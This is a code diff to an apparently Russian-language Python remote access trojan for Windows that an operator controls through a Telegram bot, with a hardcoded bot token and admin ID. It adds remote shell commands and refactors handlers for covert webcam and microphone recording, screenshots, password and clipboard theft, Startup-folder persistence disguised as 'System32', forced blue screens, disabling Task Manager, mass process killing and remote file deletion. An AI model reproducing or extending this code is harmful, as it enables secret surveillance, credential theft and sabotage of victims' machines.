@@ -1,5 +1,6 @@
 # -*- coding: utf8 -*-
 
+import re
 import os
 import sys
 import cv2
@@ -7,7 +8,6 @@ import wave
 import glob
 import time
 import shutil
-import psutil
 import telebot
 import sqlite3
 import pyaudio
@@ -15,6 +15,7 @@ import requests
 import platform
 import pyperclip
 import webbrowser
+import subprocess
 import win32crypt
 import json,base64
 import urllib.request
@@ -29,16 +30,17 @@ from comtypes import CLSCTX_ALL
 from urllib.error import HTTPError
 from win32gui import GetWindowText, GetForegroundWindow
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from subprocess import Popen, PIPE
 
 #Прокси (Если не работает)
-apihelper.proxy = {'http':'http://x.x.x.x:port'}
+#apihelper.proxy = {'https':'socks5://x.x.x.x:xxxx'}
 
 #Название файла при копировании в автозагрузку
 fname = 'System32' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
 
 #Токен/Айди
-token = 'Токен'
-adm = 'Айди'
+token = '1234526486:AAGhBdDUBc9M8XsuJCe7VUrbLXftBdC54cE'
+adm = '643200553'
 
 bot = telebot.TeleBot(token, threaded=True)
 bot.worker_pool = util.ThreadPool(num_threads=30)
@@ -57,9 +59,9 @@ menu.row(button4, button5, button6)
 menu.row(button7, button8)
 
 main2 = types.InlineKeyboardMarkup()
-button1 = types.InlineKeyboardButton("5 Секунд", callback_data='vid5')
-button2 = types.InlineKeyboardButton("10 Секунд", callback_data='vid10')
-button3 = types.InlineKeyboardButton("15 Секунд", callback_data='vid15')
+button1 = types.InlineKeyboardButton('5 Секунд', callback_data='vid5')
+button2 = types.InlineKeyboardButton('10 Секунд', callback_data='vid10')
+button3 = types.InlineKeyboardButton('15 Секунд', callback_data='vid15')
 button4 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
 main2.add(button1)
 main2.add(button2)
@@ -67,9 +69,9 @@ main2.add(button3)
 main2.add(button4)
 
 main3 = types.InlineKeyboardMarkup()
-button1 = types.InlineKeyboardButton("5 Секунд", callback_data='audio5')
-button2 = types.InlineKeyboardButton("10 Секунд", callback_data='audio10')
-button3 = types.InlineKeyboardButton("15 Секунд", callback_data='audio15')
+button1 = types.InlineKeyboardButton('5 Секунд', callback_data='audio5')
+button2 = types.InlineKeyboardButton('10 Секунд', callback_data='audio10')
+button3 = types.InlineKeyboardButton('15 Секунд', callback_data='audio15')
 button4 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
 main3.add(button1)
 main3.add(button2)
@@ -108,7 +110,7 @@ main6.row(button5, button6)
 main7 = types.ReplyKeyboardMarkup()
 button1 = types.KeyboardButton('/CD\n🗂')
 button2 = types.KeyboardButton('/Upload\n📡')
-button3 = types.KeyboardButton('/PWD\n📄')
+button3 = types.KeyboardButton('/Ls\n📄')
 button4 = types.KeyboardButton('/Remove\n🗑')
 button5 = types.KeyboardButton('/Download\n📨')
 button6 = types.KeyboardButton('/Run\n📌')
@@ -247,7 +249,7 @@ def help(command):
   '\n'
   '\n/Files - Файловый менеджер'
   '\n› /CD - Текущая директория'
-  '\n› /Pwd - Список файлов'
+  '\n› /Ls - Список файлов'
   '\n› /Remove - Удалить файл'
   '\n› /Upload - Загрузить файл'
   '\n› /Download - Скачать файл'
@@ -263,6 +265,7 @@ def help(command):
   '\n'
   '\n/Passwords - Получить пароли'
   '\n/Clipboard - Буфер обмена'
+  '\n/CMD - Выполнить команду'
   '\n'
   '\n'
   '\n_Coded by Bainky_ | *@bainki* 👾', 
@@ -278,7 +281,7 @@ def main(command):
 def main(command):
  bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode="Markdown")
 
-@bot.message_handler(commands=['Screen', 'screen'])
+@bot.message_handler(regexp='Screen')
 def screen(command):
  try:
   bot.send_chat_action(command.chat.id, 'upload_photo')
@@ -291,7 +294,7 @@ def screen(command):
  except:
   pass
 
-@bot.message_handler(commands=['Webcam', 'webcam'])
+@bot.message_handler(regexp='Webcam')
 def webcam(command):
  try:
   bot.send_chat_action(command.chat.id, 'upload_photo')
@@ -308,27 +311,27 @@ def webcam(command):
  except:
  	bot.send_message(command.chat.id, '*Камера не найдена*', parse_mode="Markdown")
 
-@bot.message_handler(commands=['WebcamVid', 'webcamvid'])
-def webcam(command):
+@bot.message_handler(regexp='WebcamVid')
+def webcamvid(command):
  bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '*Выберите длительность видео*', reply_markup=main2, parse_mode='Markdown')
 
-@bot.message_handler(commands=['Audio', 'audio'])
+@bot.message_handler(regexp='Audio')
 def audio(command):
  bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '*Выберите длительность записи*', reply_markup=main3, parse_mode='Markdown')
 
-@bot.message_handler(commands=['Power', 'power'])
+@bot.message_handler(regexp='Power')
 def power(command):
  bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main4, parse_mode="Markdown")
 
-@bot.message_handler(commands=['AutoRun', 'autorun'])
+@bot.message_handler(regexp='AutoRun')
 def autorun(command):
  bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main5, parse_mode="Markdown")
 
-@bot.message_handler(commands=['OpenEXE', 'openexe'])
+@bot.message_handler(regexp='OpenEXE')
 def openexe(command):
  bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '*Выберите параметр*', reply_markup=main9, parse_mode="Markdown")
@@ -338,7 +341,8 @@ def callback_inline(call):
  if call.message:
   if call.data == 'vid5':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
       bot.send_chat_action(call.message.chat.id, 'upload_video')
       capture_duration = 5
       cap = cv2.VideoCapture(0)
@@ -365,7 +369,8 @@ def callback_inline(call):
 
   if call.data == 'vid10':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
       bot.send_chat_action(call.message.chat.id, 'upload_video')
       capture_duration = 10
       cap = cv2.VideoCapture(0)
@@ -391,7 +396,8 @@ def callback_inline(call):
 
   if call.data == 'vid15':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
       bot.send_chat_action(call.message.chat.id, 'upload_video')
       capture_duration = 15
       cap = cv2.VideoCapture(0)
@@ -418,7 +424,8 @@ def callback_inline(call):
 
   if call.data == 'audio5':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
       bot.send_chat_action(call.message.chat.id, 'record_audio')
       CHUNK = 1024
       FORMAT = pyaudio.paInt16
@@ -450,11 +457,12 @@ def callback_inline(call):
       voice.close()
       os.remove('C:\\ProgramData\\voice.wav')
     except:
-    	pass
+    	bot.send_message(call.message.chat.id, '*Не удалось записать аудио*', parse_mode="Markdown")
 
   if call.data == 'audio10':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
       bot.send_chat_action(call.message.chat.id, 'record_audio')
       CHUNK = 1024
       FORMAT = pyaudio.paInt16
@@ -486,11 +494,12 @@ def callback_inline(call):
       voice.close()
       os.remove('C:\\ProgramData\\voice.wav')
     except:
-    	pass
+    	bot.send_message(call.message.chat.id, '*Не удалось записать аудио*', parse_mode="Markdown")
 
   if call.data == 'audio15':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
       bot.send_chat_action(call.message.chat.id, 'record_audio')
       CHUNK = 1024
       FORMAT = pyaudio.paInt16
@@ -522,25 +531,28 @@ def callback_inline(call):
       voice.close()
       os.remove('C:\\ProgramData\\voice.wav')
     except:
-    	pass
+    	bot.send_message(call.message.chat.id, '*Не удалось записать аудио*', parse_mode="Markdown")
 
   if call.data == 'poweroff':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Компьютер выключен!*', parse_mode="Markdown")
-      os.system('shutdown -s /t 0 /f')
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Компьютер выключен!*', parse_mode="Markdown")
+      subprocess.Popen('shutdown -s /t 0 /f')
     except:
       pass
 
   if call.data == 'reboot':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Компьютер перезагружен!*', parse_mode="Markdown")
-      os.system('shutdown -r /t 0 /f')
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Компьютер перезагружен!*', parse_mode="Markdown")
+      subprocess.Popen('shutdown -r /t 0 /f')
     except:
       pass
 
   if call.data == 'bsod':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*BSoD активирован!*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*BSoD активирован!*', parse_mode="Markdown")
       tmp1 = c_bool()
       tmp2 = DWORD()
       ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
@@ -553,30 +565,35 @@ def callback_inline(call):
       path = 'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
       file = os.path.basename(sys.argv[0])
       if os.path.exists(path + fname):
-        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + fname + '* уже находится в автозагрузке!', parse_mode="Markdown")
+        bot.edit_message_text(chat_id=call.message.chat.id,
+        message_id=call.message.message_id, text='*' + fname + '* уже находится в автозагрузке!', parse_mode="Markdown")
         os.startfile(path + fname)
       else:
         shutil.copy2((sys.argv[0]), r'' + path)
-        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + file + '* скопирован в автозагрузку!', parse_mode="Markdown")
-        time.sleep(1)
+        bot.edit_message_text(chat_id=call.message.chat.id,
+        message_id=call.message.message_id, text='*' + file + '* скопирован в автозагрузку!', parse_mode="Markdown")
         os.rename(path + os.path.basename(sys.argv[0]), path + fname)
-        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + file + '* переименован в *' + fname + '*', parse_mode="Markdown")
+        bot.edit_message_text(chat_id=call.message.chat.id,
+        message_id=call.message.message_id, text='*' + file + '* переименован в *' + fname + '*', parse_mode="Markdown")
         os.utime(path + fname,(1330712280, 1330712292))
-        time.sleep(2)
         os.startfile(path + fname)
-        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + fname + '* запущен из автозагрузки!', parse_mode="Markdown")
-        time.sleep(2)
+        bot.edit_message_text(chat_id=call.message.chat.id,
+        message_id=call.message.message_id, text='*' + fname + '* запущен из автозагрузки!', parse_mode="Markdown")
     except:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")
 
   if call.data == 'uninstall':
-    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Вы уверены?*', reply_markup=main12, parse_mode="Markdown")
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='*Вы уверены?*', reply_markup=main12, parse_mode="Markdown")
 
   if call.data == 'confirm':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Завершаем текущий процесс...*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Завершаем текущий процесс...*', parse_mode="Markdown")
       time.sleep(2)
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + os.path.basename(sys.argv[0]) + '* удален!', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*' + os.path.basename(sys.argv[0]) + '* удален!', parse_mode="Markdown")
       directory = 'C:\\ProgramData\\'
       with open(os.path.join(directory, 'uninstaller.bat'), 'w') as OPATH:
         OPATH.writelines(['taskkill /f /im "' + os.path.basename(sys.argv[0]) + '"\n', 
@@ -584,17 +601,20 @@ def callback_inline(call):
                           'del /s /q "', sys.argv[0]])
       os.startfile('C:\\ProgramData\\uninstaller.bat')
     except:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")
 
   if call.data == 'taskkill all':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Останавливаем...*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Останавливаем...*', parse_mode="Markdown")
       directory = 'C:\\ProgramData\\'
       with open(os.path.join(directory, 'taskkill.bat'), 'w') as OPATH:
           OPATH.writelines(['if "%~1"=="" (set "x=%~f0"& start "" /min "%comspec%" /v/c "!x!" any_word & exit /b)\n', 
                             'taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "' + os.path.basename(sys.argv[0]) + '"'])
       os.startfile('C:\\ProgramData\\taskkill.bat')
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Все процессы остановлены!*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Все процессы остановлены!*', parse_mode="Markdown")
     except:
       pass
 
@@ -602,53 +622,61 @@ def callback_inline(call):
     try:
       directory = 'C:\\ProgramData\\'
       with open(os.path.join(directory, 'regedit.bat'), 'w') as OPATH:
-          OPATH.writelines(['reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n', 
-                            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f\n',
+          OPATH.writelines(['reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n',
                             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f'])
       os.startfile('C:\\ProgramData\\regedit.bat', 'runas')
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Диспетчер задач отключен!*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Диспетчер задач отключен!*', parse_mode="Markdown")
     except OSError:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Отказано в доступе*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Отказано в доступе*', parse_mode="Markdown")
     except:
-      bot.send_message(command.chat.id, '*Ошибка*', parse_mode="Markdown")
+      pass
 
   if call.data == 'startfile':
-    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Выберите программу*', reply_markup=main10, parse_mode="Markdown")
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='*Выберите программу*', reply_markup=main10, parse_mode="Markdown")
 
   if call.data == 'chrome':
     try:
       os.startfile('chrome.exe')
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Chrome открыт!*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Chrome открыт!*', parse_mode="Markdown")
     except:
       pass
 
   if call.data == 'explorer':
     try:
       os.startfile('explorer.exe')
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Explorer открыт!*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Explorer открыт!*', parse_mode="Markdown")
     except:
       pass
 
   if call.data == 'paint':
     try:
       os.startfile('mspaint.exe')
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Paint открыт!*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Paint открыт!*', parse_mode="Markdown")
     except:
       pass
 
   if call.data == 'cmd':
     try:
       os.startfile('cmd.exe')
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*CMD открыт!*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*CMD открыт!*', parse_mode="Markdown")
     except:
       pass
 
   if call.data == 'infinityopen':
-    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Выберите программу*', reply_markup=main11, parse_mode="Markdown")
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='*Выберите программу*', reply_markup=main11, parse_mode="Markdown")
 
   if call.data == 'infchrome':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Chrome открыт!*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Chrome открыт!*', parse_mode="Markdown")
       while True:
         os.startfile('chrome.exe')
     except:
@@ -656,7 +684,8 @@ def callback_inline(call):
 
   if call.data == 'infexplorer':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Explorer открыт!*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Explorer открыт!*', parse_mode="Markdown")
       while True:
         os.startfile('explorer.exe')
     except:
@@ -664,7 +693,8 @@ def callback_inline(call):
 
   if call.data == 'infpaint':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Paint открыт!*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Paint открыт!*', parse_mode="Markdown")
       while True:
         os.startfile('mspaint.exe')
     except:
@@ -672,52 +702,43 @@ def callback_inline(call):
 
   if call.data == 'infcmd':
     try:
-      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*CMD открыт!*', parse_mode="Markdown")
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*CMD открыт!*', parse_mode="Markdown")
       while True:
         os.startfile('cmd.exe')
     except:
       pass
 
   if call.data == 'back':
-    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Выберите параметр*', reply_markup=main9, parse_mode="Markdown")
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='*Выберите параметр*', reply_markup=main9, parse_mode="Markdown")
 
   if call.data == 'cancel':
-    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='`...`', parse_mode="Markdown")
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='`...`', parse_mode="Markdown")
 
-@bot.message_handler(commands=['Files', 'files'])
+@bot.message_handler(regexp='Files')
 def files(command):
  bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode="Markdown")
 
-@bot.message_handler(commands=['CD'])
-def cd(message):
+@bot.message_handler(regexp='CD')
+def cd(command):
  try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  os.chdir(user_msg.split("/CD ")[1])
-  bot.send_message(message.chat.id, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
+  bot.send_chat_action(command.chat.id, 'typing')
+  msg = re.split('/CD ', command.text, flags=re.I)[1]
+  os.chdir(msg)
+  bot.send_message(command.chat.id, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
  except FileNotFoundError:
-  bot.send_message(message.chat.id, '*Директория не найдена*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Директория не найдена*', parse_mode="Markdown")
  except:
-  bot.send_message(message.chat.id, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
 
-@bot.message_handler(commands=['cd'])
-def cd(message):
+@bot.message_handler(regexp='Remove')
+def remove(command):
  try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  os.chdir(user_msg.split("/cd ")[1])
-  bot.send_message(message.chat.id, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
- except FileNotFoundError:
-  bot.send_message(message.chat.id, '*Директория не найдена*', parse_mode="Markdown")
- except:
-  bot.send_message(message.chat.id, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
-
-@bot.message_handler(commands=['Remove'])
-def remove(message):
- try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/Remove ")[1])
+  bot.send_chat_action(command.chat.id, 'typing')
+  msg = re.split('/Remove ', command.text, flags=re.I)[1]
+  created = os.path.getctime(os.getcwd() + '\\' + msg)
   year,month,day,hour,minute,second=time.localtime(created)[:-3]
   def convert_bytes(num):
       for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
@@ -728,97 +749,44 @@ def remove(message):
       if os.path.isfile(file_path):
           file_info = os.stat(file_path)
           return convert_bytes(file_info.st_size)
-  bot.send_message(message.chat.id, 
-    'Файл *' + user_msg.split("/Remove ")[1] + '* удален!' 
+  bot.send_message(command.chat.id, 
+    'Файл *' + msg + '* удален!' 
     '\n' 
     '\nСоздан » %02d/%02d/%d'%(day,month,year) +
-    '\nРазмер » ' + file_size(os.getcwd() + '\\' + user_msg.split("/Remove ")[1]),
+    '\nРазмер » ' + file_size(os.getcwd() + '\\' + msg),
     parse_mode="Markdown")
-  os.remove(os.getcwd() + '\\' + user_msg.split("/Remove ")[1])
+  os.remove(os.getcwd() + '\\' + msg)
  except:
   try:
-    bot.send_chat_action(message.chat.id, 'typing')
-    created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/Remove ")[1])
+    bot.send_chat_action(command.chat.id, 'typing')
+    created = os.path.getctime(os.getcwd() + '\\' + msg)
     year,month,day,hour,minute,second=time.localtime(created)[:-3]
-    folder = os.getcwd() + '\\' + user_msg.split("/Remove ")[1]
+    folder = os.getcwd() + '\\' + msg
     folder_size = 0
     for (path, dirs, files) in os.walk(folder):
       for file in files:
         filename = os.path.join(path, file)
         folder_size += os.path.getsize(filename)
     files = folders = 0
-    for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + user_msg.split("/Remove ")[1]):
+    for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + msg):
         files += len(filenames)
         folders += len(dirnames)
-    shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/Remove ")[1])
-    bot.send_message(message.chat.id, 
-      'Папка *' + user_msg.split("/Remove ")[1] + '* удалена!'
+    shutil.rmtree(os.getcwd() + '\\' + msg)
+    bot.send_message(command.chat.id, 
+      'Папка *' + msg + '* удалена!'
       '\n'
       '\nСоздана » %02d/%02d/%d'%(day,month,year) +
       '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0)) +
       '\nСодержало » ' + "{:,} Файлов, {:,} Папок".format(files, folders),
       parse_mode="Markdown")
   except FileNotFoundError:
-  	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
+  	bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
   except PermissionError:
-  	bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
+  	bot.send_message(command.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
   except:
-  	bot.send_message(message.chat.id, '*Введите название файла\n \n› /Remove • /RemoveAll*', parse_mode="Markdown")
+  	bot.send_message(command.chat.id, '*Введите название файла\n \n› /Remove • /RemoveAll*', parse_mode="Markdown")
 
-@bot.message_handler(commands=['remove'])
-def remove(message):
- try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/remove ")[1])
-  year,month,day,hour,minute,second=time.localtime(created)[:-3]
-  def convert_bytes(num):
-      for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
-          if num < 1024.0:
-              return "%3.1f %s" % (num, x)
-          num /= 1024.0
-  def file_size(file_path):
-      if os.path.isfile(file_path):
-          file_info = os.stat(file_path)
-          return convert_bytes(file_info.st_size)
-  bot.send_message(message.chat.id, 
-    'Файл *' + user_msg.split("/remove ")[1] + '* удален!' 
-    '\n' 
-    '\nСоздан » %02d/%02d/%d'%(day,month,year) +
-    '\nРазмер » ' + file_size(os.getcwd() + '\\' + user_msg.split("/remove ")[1]),
-    parse_mode="Markdown")
-  os.remove(os.getcwd() + '\\' + user_msg.split("/remove ")[1])
- except:
-  try:
-    bot.send_chat_action(message.chat.id, 'typing')
-    created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/remove ")[1])
-    year,month,day,hour,minute,second=time.localtime(created)[:-3]
-    folder = os.getcwd() + '\\' + user_msg.split("/remove ")[1]
-    folder_size = 0
-    for (path, dirs, files) in os.walk(folder):
-      for file in files:
-        filename = os.path.join(path, file)
-        folder_size += os.path.getsize(filename)
-    files = folders = 0
-    for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + user_msg.split("/remove ")[1]):
-        files += len(filenames)
-        folders += len(dirnames)
-    shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/remove ")[1])
-    bot.send_message(message.chat.id, 
-      'Папка *' + user_msg.split("/remove ")[1] + '* удалена!'
-      '\n'
-      '\nСоздана » %02d/%02d/%d'%(day,month,year) +
-      '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0)) +
-      '\nСодержало » ' + "{:,} Файлов, {:,} Папок".format(files, folders),
-      parse_mode="Markdown")
-  except FileNotFoundError:
-    bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
-  except PermissionError:
-    bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
-  except:
-    bot.send_message(message.chat.id, '*Введите название файла\n \n› /Remove • /RemoveAll*', parse_mode="Markdown")
-
-@bot.message_handler(commands=['RemoveAll', 'removeall'])
+@bot.message_handler(regexp='RemoveAll')
 def removeall(command):
  try:
   folder = os.getcwd()
@@ -852,155 +820,98 @@ def removeall(command):
  except:
   pass
 
-@bot.message_handler(commands=['Upload', 'upload'])
-def upload(message):
+@bot.message_handler(regexp='Upload')
+def upload(command):
  try:
-  user_msg = "{0}".format(message.text)
-  url = user_msg.split(" ")[1]
+  msg = re.split('/Upload ', command.text, flags=re.I)[1]
+  url = msg
   req = urllib.request.Request(url, method='HEAD')
   r = urllib.request.urlopen(req)
   file_name = 'C:\\ProgramData\\Files\\' + r.info().get_filename()
-  bot.send_message(message.chat.id, '*Скачиваем файл...*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Скачиваем файл...*', parse_mode="Markdown")
   urllib.request.urlretrieve(url, file_name)
-  bot.reply_to(message, '*Файл загружен на компьютер!*\n \n`' + file_name + '`', parse_mode="Markdown")
+  bot.reply_to(command, '*Файл загружен на компьютер!*\n \n`' + file_name + '`', parse_mode="Markdown")
  except urllib.error.HTTPError as err:
-  bot.send_message(message.chat.id, '*Ссылка не найдена*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Ссылка не найдена*', parse_mode="Markdown")
  except ValueError:
-  bot.send_message(message.chat.id, '*Вставьте рабочую ссылку*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Вставьте рабочую ссылку*', parse_mode="Markdown")
  except:
-  bot.send_message(message.chat.id, '*Отправьте файл или вставьте URL-Ссылку\n \n› /Upload*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Отправьте файл или вставьте URL-Ссылку\n \n› /Upload*', parse_mode="Markdown")
 
 @bot.message_handler(content_types=['document'])
-def document(message):
+def document(command):
  try:
-  file_info = bot.get_file(message.document.file_id)
-  bot.send_message(message.chat.id, '*Скачиваем...*', parse_mode="Markdown")
+  file_info = bot.get_file(command.document.file_id)
+  bot.send_message(command.chat.id, '*Загружаем...*', parse_mode="Markdown")
   downloaded_file = bot.download_file(file_info.file_path)
   src='C:\\ProgramData\\Files\\'+file_info.file_path;
   with open(src, 'wb') as new_file:
    new_file.write(downloaded_file)
-  bot.reply_to(message, '*Файл загружен на компьютер!*\n \n`C:/ProgramData/Files/' + file_info.file_path + '`', parse_mode="Markdown")
